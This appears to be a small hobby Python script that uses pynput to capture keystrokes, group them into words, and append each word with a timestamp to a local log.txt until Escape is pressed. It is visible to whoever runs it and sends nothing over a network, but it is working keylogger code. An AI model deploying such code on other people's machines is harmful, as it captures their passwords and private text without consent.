from pynput import keyboard
import time

def on_press(key):
	global string
	#checks for spacebar pressed in order to separate chunks of letters i.e. words
	if key == keyboard.Key.space:
		
		if not word:
			print("EMPTY")

		else:	
			for character in word:
				#adds character to string which will be printed out 
				string += str(character.strip("\'"))
			
			data = str(string) + "  " + str(time.asctime()) + "\n"
			#print(data)
			log_tofile(data)
			data = ""
			
			#resets data collected
			del word[:]
			string = ""
	
	elif key == keyboard.Key.esc:
		return False
	
	else:
		#print("Pressed¬ %s" % key)
		word.append("%s" % key)

def log_tofile(data):
	with open("log.txt", "a") as log:
		log.write(data)	

def on_release(key):
	#print("Release Key¬ %s" % key)
	return True

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
	print("Press esc to quit")
	word,string = [], ""	
	listener.join()